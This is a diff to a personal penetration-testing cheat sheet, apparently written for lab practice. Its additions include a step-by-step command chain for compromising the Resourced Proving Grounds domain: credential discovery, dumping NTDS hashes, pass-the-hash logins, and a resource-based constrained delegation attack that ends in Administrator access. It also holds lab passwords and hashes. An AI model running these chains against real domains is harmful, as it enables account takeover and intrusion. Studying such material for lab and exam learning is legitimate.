@@ -928,6 +928,7 @@ smbclient //server/share -U <username>
 smbclient //server/share -U domain/username
 smbclient //<IP Address or Hostname>/<Share Name> -U <username>%<password>
 
+
 #SMBCLIENT Shell, Download multiple file using, It will download only file not folders
 mget *     # Every time need to click yes, yes ..
 
@@ -944,6 +945,10 @@ smbmap -H <target_ip> -u <username> -p <password> -r <share_name>
 #Within SMB session
 put <file> #to upload file
 get <file> #to download file
+
+# SMB Shell with impacket-smbclient, Resourced PG Pracice  https://www.youtube.com/watch?v=xMTCZt5DRB0
+impacket-smbclient v.Ventz:'HotelCalifornia194!'@192.168.177.175 # Resourced PG Pracice
+
 
 # Exploit finder faced old machine line (445/tcp, open, microsoft-ds syn-ack ttl 125 Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP))
 nmap --script smb-vuln* -p 139,445 -oN smb-vuln-scan 192.168.177.40  # Internal pg practice
@@ -2015,10 +2020,12 @@ dir /s SYSTEM
 reg save hklm\sam c:\sam
 reg save hklm\system c:\system
 ```
--Cracking the hashes 
+### impacket-secretsdump SAM SYSTEM ntds.dit
+-Cracking the hashes using impacket-secretsdump using system either SAM or ntds.dit
 - If the hash seems to be like “31d6cfe0d16ae931b73c59d7e0c089c0” it means may be disabled accounts https://www.vanimpe.eu/2019/03/07/mimikatz-and-hashcat-in-practice/
 ```bash
 impacket-secretsdump -system SYSTEM -sam SAM local #always mention local in the command
+impacket-secretsdump -ntds ntds.dit -system SYSTEM local 
 #Now a detailed list of hashes are displayed
 ```
 
@@ -2598,7 +2605,7 @@ wmic computersystem get domain
 Test-Connection -ComputerName (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true} | Select-Object -First 1 -ExpandProperty DNSDomain)
 ```
 
-### Bloodhound
+### Bloodhound-python creds and hashes
 
 - Collection methods - database
 - If you don't have login with Windows AD box we can try [Gitub](https://github.com/dirkjanm/BloodHound.py)
@@ -2612,6 +2619,7 @@ Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefi
 #HacktheBox - Blackfield box - ippsec
 python3 bloodhound -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all 
 bloodhound-python -u 'uname' -p 'pass' -ns <rhost> -d <domain-name> -c all #output will be saved in you kali machine
+bloodhound-python -u L.Livingstone --hashes 19a3a7550ce8c505c2d46b5e39d6f808:19a3a7550ce8c505c2d46b5e39d6f808 -ns 192.168.177.175 -d resourced.local -c all #NTLM:NTLM, resourced pg practice
 ```
 #### Running Bloodhound
 
@@ -3059,6 +3067,26 @@ cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decod
 print(cmdline)
 ```
 
+### Generic All permission in Active Directory 
+- In Bloodhound, I saw user has the permission to GenericALL to Domain(Computer), Create new computer -> Add a deligation -> create impersonate token(It will generate token) -> export the ticket -> Login with computer with admin access.
+- Example Resourced - PG Practice [medium](https://r4j3sh.medium.com/offsec-resourced-proving-grounds-practice-writeup-78e132df93cf)
+```powershell
+enum4linux 192.168.177.175 # Got user creds in description
+rpcclient -U="" -N 192.168.177.175
+>querydispinfo # Got user creds in description
+smbclient -L //192.168.177.175/ -U 'v.Ventz'
+impacket-smbclient  v.Ventz:'HotelCalifornia194!'@192.168.177.175 # their is SYSTEM and ntds.dit
+impacket-secretsdump -ntds ntds.dit -system SYSTEM local # Got users hashes, make it users and hashes file with LM:NTLM hashes
+nxc winrm 192.168.177.175 -u users.txt -H hashes.txt
+evil-winrm -i 192.168.177.175 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
+bloodhound-python -u L.Livingstone --hashes 19a3a7550ce8c505c2d46b5e39d6f808:19a3a7550ce8c505c2d46b5e39d6f808 -ns 192.168.177.175 -d resourced.local -c all #NTLM:NTLM, resourced pg 
+# In that showed user has GenericAll permission to AD computer
+impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.177.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'r4j3sh$' -computer-pass 'Rajesh@Mondal'
+python3 rbcd.py -action write -delegate-to "RESOURCEDC$" -delegate-from "r4j3sh$" -dc-ip 192.168.177.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced/l.livingstone
+python3 getST.py -spn cifs/resourcedc.resourced.local -impersonate Administrator resourced/r4j3sh\\$:'Rajesh@Mondal' -dc-ip 192.168.177.175
+export KRB5CCNAME=Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
+sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.177.175
+```
 # Public Exploit
 
 <aside>
